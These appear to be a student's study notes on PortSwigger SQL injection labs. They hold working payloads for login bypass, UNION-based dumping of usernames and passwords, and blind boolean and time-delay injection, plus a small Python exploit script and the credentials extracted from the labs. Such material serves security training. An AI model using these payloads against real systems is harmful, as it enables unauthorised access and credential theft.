> [!NOTE]
> If Internal server error come then it means something is happening at back end

# Payloads


> [!NOTE] Title
> Always use `#` or `//` if `--` won't work as these are other commenting operator

```
' OR 1=1--                        (GOLD)
administrator' --
```

# WHERE clause allowing retrieval of hidden data
https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data

When there's a query like this
```
web-security-academy.net/filter?category=Pets
```

try to modify field with IDOR, path traversal, SQLI

Verify by putting `'`
### Used Payload
```
web-security-academy.net/filter?category=' OR 1=1--
```

which means
```
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
```
it will neglect rest of code after --

### Notes
SQL injection - product category filter

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

End goal: display all products both released and unreleased.

**Analysis:**

SELECT * FROM products WHERE category = 'Pets' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1 

SELECT * FROM products WHERE category = ''--' AND released = 1 

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 

### Python script
```
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
```

# vulnerability allowing login bypass
https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass#

in login always try out this one

```
admin' --
administrator' --
```

this is effective when we know username

Verify by putting `'`
### Used Payload
```
administrator' --
```

which means
```
SELECT firstname FROM users where username='administrator'--' and password='admin'
```
it will neglect rest of code after --

### Notes
SQL injection - Login functionality

End Goal: perform SQLi attack and log in as the administrator user. 


**Analysis:**

SELECT firstname FROM users where username='admin' and password='admin'

SELECT firstname FROM users where username=''' and password='admin'

SELECT firstname FROM users where username='administrator'--' and password='admin'

SELECT firstname FROM users where username='admin'
# UNION attack, determining the number of columns returned by the query
https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns

> [!NOTE]
> This lab is for determine columns

we can do it by Order by or by NULL value
### Used Payload
```
/filter?category=' UNION SELECT NULL,NULL,NULL,NULL--
```

this will return no error there are 3 rows

```
/filter?category=Gift' ORDER BY 3--
```

### Notes

SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

SQLi attack (way #1):

select ? from table1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3




# SQL injection UNION attack, finding a column containing text
https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text

> [!NOTE]
> This lab is for determine datatypes

### Used Payload
```
filter?category=' UNION SELECT NULL, 'a',NULL --
```

### Notes

select a, b, c from table1 UNION select NULL, NULL, 'a'
-> error -> column is not type text
-> no error -> column is of type text

Analysis:

' order by 1--
-> 3 columns -> 1st column is not shown on the page.

' UNION select NULL, 'KsZXy4', NULL--
-> 2nd column of type string

' UNION select 'a', NULL, NULL--'
' UNION select NULL, 'a', NULL--


# SQL injection UNION attack, retrieving data from other tables

> [!NOTE]
> After determined the number of columns returned by the original query and found which columns can hold string data, we are in a position to retrieve interesting data

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this example, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`

In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

![[Pasted image 20240506184706.png]]

First we get to know that there's 2 columns

![[Pasted image 20240506184829.png]]

no error for string in both columns, that means both are in string type

### Payload used
```
/filter?category=Gifts ' UNION SELECT username, password FROM users--
```

### Notes
SQL Injection - Product category filter.

End Goal - Output the usernames and passwords in the users table and login as the administrator user.

Analysis:

1) Determine # of columns that the vulnerable query is using
' order by 1--
' order by 2--
' order by 3-- -> internal server error

3-1 = 2


2) Determine the data type of the columns

select a, b from products where category='Gifts

' UNION select 'a', NULL--
' UNION select 'a', 'a'--
-> both columns are of data type string

' UNION select username, password from users--

administrator
tqx26ugf8jp1g30atsu9


# Retrieving multiple values within a single column
https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

we can retrieve multiple values together within this single column by concatenating the values together. we can include a separator to let you distinguish the combined values. For example, on Oracle we could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

> [!NOTE]
> Different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

First determine columns and datatypes of column

here, in this case we got 2 columns and 2nd have string datatype

next step is to know which data type is this. For this, we can check with cheat sheet

![[Pasted image 20240506190543.png]]

### Payload used
```
/filter?category=Pets' UNION SELECT NULL,username || ' ' || password FROM users--`
```

![[Pasted image 20240506192746.png]]

Middle space can be replaced by any character just to separate output of column

### Notes
SQL Injection - Product category filter

End Goal: retrieve all usernames and passwords and login as the administrator user.

Analysis:
--------

(1) Find the number of columns that the vulnerable is using:
' order by 1-- -> not displayed on the page
' order by 2-- -> displayed on the page
' order by 3-- -> internal server error

3 - 1 = 2

(2) Find which columns contain text
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'-- ->**

(3) Output data from other tables

' UNION select NULL, username from users--
' UNION select NULL, password from users--

' UNION select NULL, version()--
-> PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

`' UNION select NULL, username || ' ' || password from users--

carlos hx8lpsrznosr462ydnvh
administrator 35v95vbpktdv4c2nqgak
wiener 0qc4vtnx4o08sr5nsstf


# Blind SQL injection with conditional responses
https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses.


### Used Payload

first get to know about vulnerable parameter

check with conditions

then get length of password with numbers attack from intruder
![[Pasted image 20240506222844.png]]

length is different at 20 which means password is =20 because we used query pass>20




### Notes
Lab 11 - Blind SQL injection with conditional responses

Vulnerable parameter - tracking cookie

End Goals:
1) Enumerate the password of the administrator
2) Log in as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to blind SQLi

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
-> TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
-> FALSE -> no Welcome back

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
-> users table exists in the database.

3) Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
-> administrator user exists

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
-> password is exactly 20 characters

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20

1=e
2=l
3=b
4=
5=
6=k
7=t
8=e
9=e
10=d
11=
12=c
13=
14=
15=
16=o
17=
18=d
19=
20=t

# Blind SQL injection with time delays
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

### Notes
Lab #13 - Blind SQL Injection with time delays

Vulnerable parameter - tracking cookie

End Goal:
- to prove that the field is vulnerable to blind SQLi (time based)

Analysis:

select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';

' || (SELECT sleep(10))-- -x
' || (SELECT pg_sleep(10))-- 